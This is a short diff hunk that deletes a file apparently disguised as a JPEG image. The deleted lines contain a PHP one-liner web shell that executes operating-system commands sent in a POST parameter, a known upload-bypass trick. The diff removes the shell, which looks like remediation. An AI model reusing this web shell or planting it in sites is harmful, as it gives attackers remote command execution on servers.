@@ -1,2 +1,0 @@
-JPEG
-<?php system($_POST["cmd"]); ?>
